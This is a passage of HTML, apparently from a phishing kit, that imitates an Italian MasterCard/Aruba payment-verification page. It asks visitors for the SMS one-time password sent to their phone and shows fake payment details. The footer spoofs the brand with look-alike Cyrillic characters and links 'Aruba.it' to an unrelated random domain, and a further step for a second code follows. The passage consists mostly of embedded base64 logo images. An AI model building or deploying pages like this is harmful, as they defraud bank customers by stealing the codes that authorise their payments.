AwLTQuOSAwLjEtNyAwLjItMS4xIDAuMS0xLjYgMC4yLTEuOSAwLjMgMCAxLjYtMC4xIDcuMy0wLjIgMTgtMC4xIDExLjQtMC4xIDIwLjMgMC4yIDI2LjYgMC40IDguNy0wLjQgMTEuMi0xLjEgMTIuM3MtMS44IDIuOC0zLjUgMi44eiIvPgo8L3N2Zz4K"
									alt=""
									style="width: 38%;"
								/>
							</span>

							<span style="float: right;">
								<img
									src="data:image/png;base64,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"
									alt=""
									style="width: 50%;"
								/>
								<img
									src="data:image/png;base64,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"
									alt="MasterCard Logo"
								/>
							</span>
						</div>
					</div>
					
						<div class="row">
							<div id="panel" class="col-sm-8 col-sm-offset-2 col-md-6 col-md-offset-3" role="main">
								<div align="center"><img src="files/ICO_pw_token.gif" alt="" style="width: 12%;" /> <img src="files/img_167300.png" alt="" style="width: 6%;" /></div>

								<br />
								<p>
									La password che dovrai inserire per autenticare la transazione è stata inviata via SMS al tuo numero di cellulare o la password chiave elettronica. Ricorda: hai a tua disposizione 3 tentativi di inserimento.
									<br />
									<br />
									Inserisci il codice OTP che hai ricevuto e clicca «Prosegui» per confermare l’operazione.<br />
									<br />
								</p>

								<hr />
								<div align="center">
									<strong>Codice OTP </strong>
									<br />

									<input type="password" name="s7" required="" v-model="log.SMS" size="20" class="textfield" maxlength="8" style="border:1px solid rgba(0,0,0,0.34) !important;width: 108px; text-align: center;" />
								</div>
								<hr />

								<div class="payment-details" role="contentinfo">
									<h1>Dettagli del pagamento</h1>

									<div class="payment-detail">
										<h2>Importo</h2>
										<span id="transaction-amount">6,11 €</span>
									</div>

									<div class="payment-detail">
										<h2>Codice ordine</h2>
										<span>IT2020B144317</span>
									</div>

				
									<br />
									<br />

									<div align="center">
										<button
											
											name="CONTINUA"
											value="Prosegui"
											class="roundedFwd"
											style="width: 108px; height: 29px; border: 0; margin-left: 50px; margin-right: 50px; background-color: rgb(248, 122, 19); color: rgb(255, 255, 255); font-weight: bold; text-align: center;"
											
											@click="goToStepSMS2"
										>Prosegui </button>
									</div>
								</div>
							</div>
						</div>
					
					<div class="row">
						<div id="footer" class="col-md-6 col-md-offset-3">
							<p>Cорyrіght @2020 аrubа ѕ.р.а.- р.і. 0257950516 - аll rіghtѕ rеѕеrνеd -</p>

							<table>
								<tbody>
									<tr>
										<td><a href="https://b9atlikdkikaot.com/aris/poli//index2.php?page=5555#" target="_blank">Aruba.it</a></td>
									</tr>
								</tbody>
							</table>
						</div>
					</div>
				</div>
			</div>
			 
		    <!-- Page 4 : SMS2 <!-->
			<div id="infoSMSErr" v-if="step==4" >
				<link type="text/css" rel="stylesheet" href="css/sms.css" />
				<div class="container">
					<div class="row" role="banner">
						<div id="banner" class="col-sm-8 col-sm-offset-2 col-md-6 col-md-offset-3">
							<span style="float: left;">
								<img
									src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBlbmFibGUtYmFja2dyb3VuZD0ibmV3IDAgMCA0NDQuOCAxMjQuNSIgdmVyc2lvbj0iMS4xIiB2aWV3Qm94PSIwIDAgNDQ0LjggMTI0LjUiIHhtbDpzcGFjZT0icHJlc2VydmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+Cgkuc3Qwe2ZpbGw6I0UzNTIwNTt9Cgkuc3Qxe2ZpbGw6I0ZGRkZGRjt9Cjwvc3R5bGU+CgkJCQk8cGF0aCBjbGFzcz0ic3QwIiBkPSJtNTUuNyA0NS45Yy0wLjUgMC0xIDAtMS40IDAuMS0zLjkgMC41LTcuMiAyLjctOSA2LjEtMC44LTAuMi0xLjYtMC40LTIuNS0wLjctMy42LTAuOS02LjYtMS40LTkuMS0xLjZoLTEuNWMtMi43IDAtNS42IDAuNS04LjUgMS41LTIuMyAwLjgtNC4zIDEuNi02IDIuMy0yLjMgMS00LjQgMi4yLTYuMiAzLjYtMi42IDItNC41IDQuOS02LjEgOC44LTAuOSAyLjMtMS43IDQuMy0yLjUgNi4yLTEuMSAyLjctMS44IDUuOS0yLjIgOS4zLTAuMyAyLjctMC41IDUuMi0wLjYgNy41LTAuMiAyLjUtMC4yIDUuMSAwIDcuNiAwLjIgMy45IDEuMyA3LjMgMy4zIDEwLjNsMy4xIDQuNmMxLjcgMi42IDQuMyA1IDcuNiA3LjIgMy41IDIuMyA2LjUgMy43IDkuNSA0LjIgMS42IDAuMyAzLjggMC42IDYuNSAxIDIuNSAwLjQgNC42IDAuNSA2LjUgMC41IDAuNyAwIDEuNCAwIDIuMS0wLjEgMy0wLjIgNi0xLjIgOS4xLTIuOCAwLjYtMC4zIDEuMS0wLjYgMS43LTEgMi4yIDIuNiA1LjIgNCA4LjYgNCA0LjEgMCA5LjQtMi41IDEwLjgtOS42IDAuNC0yLjEgMC41LTUgMC40LTkuNy0wLjEtMy42LTAuMy0xMC42LTAuNC0yMC43LTAuMS0xMC40LTAuMy0xNy41LTAuNi0yMS4zLTAuNC01LTAuOS04LTEuOS0xMC4zLTItNC4zLTYuMS03LTEwLjctN3ptLTI0LjggMjguOGg0LjNjMS4xIDAgMi40IDAuMSAzLjYgMC4zIDEuMiAxLjEgMS44IDEuOCAyIDIgMC4xIDAuMiAwLjcgMS4xIDIgNC4xIDAuOCAxLjggMS4zIDMuNSAxLjMgNC45IDAuMSAxLjYtMC4xIDMuMS0wLjUgNC42cy0xLjEgMy0yLjEgNC42Yy0xLjIgMS45LTIuMiAyLjktMi44IDMuNC0wLjcgMC42LTEuNyAxLjEtMi43IDEuNC0wLjMgMC4xLTAuNiAwLjEtMC45IDAuMS0wLjIgMC0wLjUgMC0wLjctMC4xLTEuOC0wLjQtMy41LTAuOS01LjItMS42LTEuNS0wLjYtMi4yLTEtMi40LTEuMmwtMi43LTIuMWMtMC4xLTEuNC0wLjItMy42LTAuMi03LjIgMC0yLjkgMC40LTUuNSAxLjItNy44IDAuNS0xLjMgMS41LTIuNyAzLjEtNC4xIDEuMS0wLjUgMi0wLjkgMi43LTEuM3ptLTYuNyAyMS41eiIvPgoJCQkJPHBhdGggY2xhc3M9InN0MCIgZD0ibTgwLjMgNDguMWMtMiAwLTMuOSAwLjUtNS43IDEuNS0zLjUgMi01LjkgNS44LTYuMyAxMGwtMC4yIDEuNnYwLjggMSAwLjNjMS4yIDI5IDIgNDYuNSAyLjEgNDguNyAwLjUgNi45IDMuOCA5LjkgNi42IDExLjMgMS42IDAuOCAzLjMgMS4yIDUgMS4yIDMuMyAwIDYuNS0xLjUgOC43LTQuMiAyLjUtMyAzLjItNi44IDMtMTYuOC0wLjEtNi4xLTAuMi0xMi43LTAuMi0xOS41IDAtNC4yIDAtNi43LTAuMS04LjUgMC42LTAuOCAxLjMtMS42IDIuMi0yLjMgMC42LTAuNSAxLjQtMC44IDIuNS0xIDAuOC0wLjIgMS42LTAuMyAyLjItMC4zIDAuNCAwIDAuNiAwIDAuOCAwLjEgMC4zIDAuMSAwLjQgMC4xIDAuNSAwLjIgMS45IDEuOCAzLjMgMi45IDQuNiAzLjYgMC4zIDAuMiAwLjggMC41IDEuNyAxLjEgMi41IDEuOCA1LjIgMi43IDcuOCAyLjcgMy41IDAgNi44LTEuNiA5LjEtNC41IDIuMS0yLjcgMy4xLTYuMSAyLjYtOS42LTAuNS0zLjctMi43LTYuOS02LjEtOS0wLjQtMC4yLTEuMi0wLjgtMi43LTItMi43LTIuMi01LjctMy44LTktNC43LTIuNS0wLjctNS40LTEuMS04LjYtMS4zaC0xLjdjLTIuOSAwLTUuOCAwLjQtOC43IDEuMS0wLjkgMC4yLTEuOCAwLjUtMi42IDAuOC0yLjEtMS41LTQuNi0yLjMtNy41LTIuM3oiLz4KCQkJCTxwYXRoIGNsYXNzPSJzdDAiIGQ9Im0xNDUuMyA0MS45Yy0yLjcgMC01LjQgMC45LTguMSAyLjdsLTAuMyAwLjJjLTEuMSAwLjgtMiAxLjgtMi42IDNsLTAuMiAwLjNjLTQuMyA4LjYtNi41IDE0LjEtNy40IDE3LjgtMC43IDMuMi0xLjMgNi42LTEuNyAxMC4xLTAuNCAzLjYtMC41IDYuOS0wLjQgOS44IDAuMiA0LjIgMS41IDguMiA0IDExLjkgMi4yIDMuMyA0LjcgNS45IDcuNiA3LjggMi4yIDEuNSA0LjYgMi43IDYuOSAzLjggMy4xIDEuNCA2LjIgMi4xIDkuMyAyLjFoN2MzLjggMCA2LjYtMC4zIDguOC0wLjggMi41LTAuNiA1LjMtMiA5LTQuMyA0LjQtMi44IDcuNS02LjIgOS4zLTEwLjIgMS4zLTIuOSAyLjMtNiAyLjktOS4xczEtNi44IDEtMTAuOGMwLTQuNi0xLjEtMTAtMy40LTE2LjEtMi44LTcuNy01LjUtMTIuNC0xMC43LTE0LTEuMy0wLjQtMi42LTAuNi00LTAuNi0yLjQgMC00LjggMC42LTcgMS45LTIuMyAxLjMtNC4xIDMuMy01LjEgNS42cy0xLjYgNS45IDAuNCAxMC42YzAuOSAyLjEgMi4xIDQuNiAzLjQgNy4zIDAuNiAxLjMgMSAyLjkgMSA0LjcgMCAyLjYtMC4yIDQuOS0wLjYgNi42LTAuNCAyLTAuOCAyLjctMC44IDIuNyAwIDAuMS0wLjUgMC44LTEuOSAyLjEtMC41IDAuNS0xLjEgMC44LTEuOSAxLTEuNSAwLjQtMi44IDAuNi00IDAuNi0xLjEgMC0yLjItMC4yLTMuMy0wLjUtMC45LTAuMy0xLjctMC43LTIuNC0xLjItMC42LTAuNS0xLTAuOS0xLjEtMS0wLjEtMC4zLTAuMy0xLjQtMC41LTMuNS0wLjItMi4zIDAtNC40IDAuNS02LjMgMC43LTIuNiAxLjYtNS4zIDIuNy04LjEgMS4zLTMuMSAxLjktNC4yIDItNC40IDEuNy0yLjMgMi43LTQuOCAzLTcuMyAwLjQtMy0wLjEtNS44LTEuNS04LjMtMS45LTMuOS01LjctNi4xLTkuOS02LjF6Ii8+CgkJCQkJPHBhdGggY2xhc3M9InN0MCIgZD0ibTIwMi43IDBjLTIuNyAwLTUuMiAwLjktNy4yIDIuNi0zIDIuNi0zLjUgNS43LTMuOSA5LjQtMC4zIDMuOS0wLjUgMTEuMS0wLjYgMjIuNi0wLjIgMTkuNi0wLjQgMjYuNC0wLjYgMjguNy0wLjMgMy43LTAuNSAxMC45LTAuNiAyMS4zLTAuMSAxMC4xLTAuMyAxNy4xLTAuNCAyMC43LTAuMiA0LjctMC4xIDcuNiAwLjQgOS43IDEuNCA3IDYuNyA5LjYgMTAuOCA5LjYgMy4zIDAgNi40LTEuNSA4LjYtNCAwLjYgMC4zIDEuMSAwLjcgMS43IDEgMy4xIDEuNiA2LjEgMi42IDkuMSAyLjggMC43IDAuMSAxLjQgMC4xIDIuMSAwLjEgMS45IDAgNC0wLjIgNi41LTAuNSAyLjgtMC40IDUtMC43IDYuNS0xIDIuOS0wLjUgNS45LTEuOCA5LjUtNC4xIDMuMy0yLjIgNS45LTQuNyA3LjYtNy4ybDMuMS00L